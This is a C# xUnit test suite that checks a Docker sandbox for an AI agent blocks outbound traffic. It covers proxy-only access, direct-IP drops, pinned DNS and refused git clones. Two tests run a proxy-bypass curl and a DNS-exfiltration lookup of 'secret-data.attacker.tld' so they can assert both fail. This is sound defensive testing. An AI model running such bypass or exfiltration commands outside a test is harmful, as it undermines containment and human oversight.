using System;
using System.Diagnostics;
using System.Threading.Tasks;
using GitLoom.Server.Tests.Fixtures;
using Xunit;

namespace GitLoom.Server.Tests.Agents;

/// <summary>
/// TI-P2-07 RequiresDocker egress matrix — each row its own test (P2-07 §4). Proves default-deny with
/// the iptables backstop (not proxy-env alone), pinned DNS (NXDOMAIN for exfil names), fast refusal
/// (not timeout), a live <c>devbox add</c>, and A6 (a direct git-host clone from the agent fails fast
/// because the git host is absent from the agent allowlist). Gated on Docker availability.
/// </summary>
[Trait("Category", "RequiresDocker")]
public class SandboxEgressDockerTests
{
    // A non-allowlisted destination must be refused within this budget — refused, not hung.
    private static readonly TimeSpan FastFailBudget = TimeSpan.FromSeconds(5);

    [RequiresDockerFact]
    public async Task Curl_AllowlistedModelApi_ShouldSucceedViaProxy()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        // A 200/401 both prove the connection reached the API through the proxy (auth aside).
        var result = await fx.ExecAsync(handle.ContainerId,
            "curl", "-sS", "-o", "/dev/null", "-w", "%{http_code}", "https://api.anthropic.com/v1/models");
        Assert.Matches(@"^\d{3}$", result.Stdout.Trim());
        Assert.NotEqual("000", result.Stdout.Trim()); // 000 = never connected
    }

    [RequiresDockerFact]
    public async Task Curl_NonAllowlistedDomain_ShouldFailFast_RefusedNotTimeout()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        var sw = Stopwatch.StartNew();
        var result = await fx.ExecAsync(handle.ContainerId,
            "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", "https://example.com");
        sw.Stop();

        Assert.NotEqual(0, result.ExitCode);       // refused
        Assert.True(sw.Elapsed < FastFailBudget, $"expected fast refusal, took {sw.Elapsed}");
    }

    [RequiresDockerFact]
    public async Task DirectIpEgress_ShouldBeDropped_DespiteProxyEnvUnset()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        // Bypass HTTP_PROXY entirely and dial a raw IP: the iptables backstop must DROP it.
        var result = await fx.ExecAsync(handle.ContainerId,
            "env", "-u", "HTTP_PROXY", "-u", "HTTPS_PROXY", "-u", "http_proxy", "-u", "https_proxy",
            "curl", "-sS", "-m", "8", "-o", "/dev/null", "http://1.1.1.1");
        Assert.NotEqual(0, result.ExitCode);
    }

    [RequiresDockerFact]
    public async Task DnsExfil_ShouldFail()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        // Pinned DNS answers allowlisted names only; an exfil name must not resolve.
        var result = await fx.ExecAsync(handle.ContainerId, "getent", "hosts", "secret-data.attacker.tld");
        Assert.NotEqual(0, result.ExitCode);
    }

    [RequiresDockerFact]
    public async Task DevboxAdd_DuringLivePty_ShouldSurviveSession()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        var add = await fx.ExecAsync(handle.ContainerId, "devbox", "add", "jq");
        Assert.True(add.ExitCode == 0,
            $"devbox add jq failed (exit {add.ExitCode}).\nstdout: {add.Stdout}\nstderr: {add.Stderr}");

        var which = await fx.ExecAsync(handle.ContainerId, "sh", "-c", "command -v jq");
        Assert.True(which.ExitCode == 0,
            $"jq not on PATH after add (exit {which.ExitCode}).\nstdout: {which.Stdout}\nstderr: {which.Stderr}");
    }

    [RequiresDockerFact]
    public async Task DirectGitHostClone_FromAgent_ShouldFailFast()
    {
        await using var fx = new SandboxFixture();
        await fx.EnsureEgressReadyAsync();
        var handle = await fx.SpawnAsync();

        // A6: the git host is deliberately absent from the agent allowlist — a direct clone fails fast.
        var sw = Stopwatch.StartNew();
        var result = await fx.ExecAsync(handle.ContainerId,
            "git", "-c", "http.lowSpeedLimit=1", "-c", "http.lowSpeedTime=5",
            "clone", "--depth", "1", "https://github.com/git/git.git", "/tmp/should-not-clone");
        sw.Stop();

        Assert.NotEqual(0, result.ExitCode);
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(15), $"expected fast refusal, took {sw.Elapsed}");
    }
}
